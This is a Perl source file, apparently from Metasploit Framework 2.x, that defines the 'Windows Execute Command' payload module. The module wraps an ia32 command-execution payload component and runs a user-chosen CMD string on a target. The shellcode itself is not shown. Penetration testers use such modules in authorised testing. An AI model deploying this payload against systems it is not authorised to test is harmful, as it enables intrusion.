
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_exec;

use strict;
use base 'Msf::PayloadComponent::Windows::ia32::ExecuteCommand';

my $info =
{
	'Name'         => 'Windows Execute Command',
	'Version'      => '$Revision$',
	'Description'  => 'Execute an arbitrary command',
	'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'UserOpts'     =>
		{
			'CMD' => [1, 'DATA', 'The command string to execute'],
		},
};

sub _Load 
{
	Msf::PayloadComponent::Windows::ia32::ExecuteCommand->_Import('Msf::PayloadComponent::NoConnection');

	__PACKAGE__->SUPER::_Load();
}

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	my $self;

	_Load();

	$hash = $class->MergeHashRec($hash, {'Info' => $info});
	$self = $class->SUPER::new($hash, @_);

	return($self);
}

#
# Return the user specified command to execute
#
sub CommandString 
{
	my $self = shift;

	return $self->GetVar('CMD');
}

1;
